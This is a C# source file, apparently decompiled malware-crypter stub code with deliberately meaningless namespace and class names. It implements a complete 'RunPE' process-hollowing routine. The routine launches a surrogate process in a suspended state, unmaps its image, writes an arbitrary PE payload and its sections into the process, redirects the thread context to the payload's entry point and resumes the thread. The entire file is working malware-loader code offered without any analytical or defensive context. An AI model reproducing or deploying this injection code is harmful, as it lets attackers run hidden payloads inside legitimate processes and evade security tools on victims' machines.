using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;

namespace ajhfsdlhjasnagfgewfwsg;

public class sadioasudoixzcuoisaudoixuzcoixuzcsad
{
	[SuppressUnmanagedCodeSecurity]
	private class Win32
	{
		[DebuggerNonUserCode]
		public Win32()
		{
		}

		[DllImport("kernel32")]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool CreateProcess(string appName, StringBuilder commandLine, IntPtr procAttr, IntPtr thrAttr, [MarshalAs(UnmanagedType.Bool)] bool inherit, int creation, IntPtr env, string curDir, byte[] sInfo, IntPtr[] pInfo);

		[DllImport("kernel32")]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool GetThreadContext(IntPtr hThr, uint[] ctxt);

		[DllImport("ntdll")]
		public static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);

		[DllImport("kernel32")]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool ReadProcessMemory(IntPtr hProc, IntPtr baseAddr, ref IntPtr bufr, IntPtr bufrSize, ref IntPtr numRead);

		[DllImport("kernel32")]
		public static extern int ResumeThread(IntPtr hThr);

		[DllImport("kernel32")]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool SetThreadContext(IntPtr hThr, uint[] ctxt);

		[DllImport("kernel32")]
		public static extern IntPtr VirtualAllocEx(IntPtr hProc, IntPtr addr, IntPtr size, int allocType, int prot);

		[DllImport("kernel32")]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool VirtualProtectEx(IntPtr hProc, IntPtr addr, IntPtr size, int newProt, ref int oldProt);

		[DllImport("kernel32")]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool WriteProcessMemory(IntPtr hProc, IntPtr baseAddr, byte[] buff, IntPtr size, ref IntPtr numRead);
	}

	private static readonly int[] prot = new int[8] { 1, 16, 2, 32, 4, 64, 4, 64 };

	[DebuggerNonUserCode]
	public sadioasudoixzcuoisaudoixuzcoixuzcsad()
	{
	}

	public static void RunPE(byte[] bytes, string surrogateProcess)
	{
		int num = BitConverter.ToInt32(bytes, 60);
		checked
		{
			int num2 = BitConverter.ToInt16(bytes, num + 6);
			IntPtr size = new IntPtr(BitConverter.ToInt32(bytes, num + 84));
			byte[] sInfo = new byte[68];
			IntPtr[] array = new IntPtr[4];
			IntPtr intPtr = default(IntPtr);
			if (!Win32.CreateProcess(null, new StringBuilder(surrogateProcess), intPtr, intPtr, inherit: false, 4, intPtr, null, sInfo, array))
			{
				return;
			}
			uint[] array2 = new uint[179];
			array2[0] = 65538u;
			if (Win32.GetThreadContext(array[1], array2))
			{
				IntPtr hProc = array[0];
				IntPtr baseAddr = new IntPtr(unchecked((long)array2[41]) + 8L);
				IntPtr bufrSize = new IntPtr(4);
				IntPtr bufr = default(IntPtr);
				IntPtr numRead = default(IntPtr);
				if (Win32.ReadProcessMemory(hProc, baseAddr, ref bufr, bufrSize, ref numRead) && unchecked((long)Win32.NtUnmapViewOfSection(array[0], bufr)) == 0L)
				{
					IntPtr hProc2 = array[0];
					IntPtr intPtr2 = new IntPtr(BitConverter.ToInt32(bytes, num + 52));
					IntPtr addr = intPtr2;
					IntPtr size2 = new IntPtr(BitConverter.ToInt32(bytes, num + 80));
					IntPtr baseAddr2 = Win32.VirtualAllocEx(hProc2, addr, size2, 12288, 64);
					Win32.WriteProcessMemory(array[0], baseAddr2, bytes, size, ref numRead);
					int num3 = num2 - 1;
					int oldProt = default(int);
					for (int i = 0; i <= num3; i++)
					{
						int[] array3 = new int[10];
						Buffer.BlockCopy(bytes, num + 248 + i * 40, array3, 0, 40);
						byte[] array4 = new byte[array3[4] - 1 + 1];
						Buffer.BlockCopy(bytes, array3[5], array4, 0, array4.Length);
						IntPtr hProc3 = array[0];
						size2 = new IntPtr(baseAddr2.ToInt32() + array3[3]);
						IntPtr baseAddr3 = size2;
						intPtr2 = new IntPtr(array4.Length);
						Win32.WriteProcessMemory(hProc3, baseAddr3, array4, intPtr2, ref numRead);
						IntPtr hProc4 = array[0];
						size2 = new IntPtr(baseAddr2.ToInt32() + array3[3]);
						IntPtr addr2 = size2;
						intPtr2 = new IntPtr(array3[2]);
						Win32.VirtualProtectEx(hProc4, addr2, intPtr2, prot[(array3[9] >> 29) & 7], ref oldProt);
					}
					IntPtr hProc5 = array[0];
					size2 = new IntPtr(unchecked((long)array2[41]) + 8L);
					IntPtr baseAddr4 = size2;
					byte[] bytes2 = BitConverter.GetBytes(baseAddr2.ToInt32());
					intPtr2 = new IntPtr(4);
					Win32.WriteProcessMemory(hProc5, baseAddr4, bytes2, intPtr2, ref numRead);
					array2[44] = (uint)(baseAddr2.ToInt32() + BitConverter.ToInt32(bytes, num + 40));
					Win32.SetThreadContext(array[1], array2);
				}
			}
			Win32.ResumeThread(array[1]);
		}
	}
}
